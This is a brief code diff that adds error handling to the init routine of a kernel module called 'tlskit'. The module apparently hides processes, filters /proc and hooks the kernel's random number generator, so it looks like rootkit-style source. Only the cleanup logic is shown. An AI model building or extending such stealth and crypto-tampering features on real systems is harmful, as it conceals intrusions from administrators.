@@ -162,10 +162,15 @@ static int __init tlskit_init(void) {
         goto proc_failed;
     }
 
-    enable_process_hiding();
+    if (0 != enable_process_hiding()) {
+        goto process_failed;
+    }
 
     return 0;
 
+/* disable all the enabled functionality */
+process_failed:
+    disable_proc_filter();
 proc_failed:
     disable_csprng_hook();
 csprng_failed:
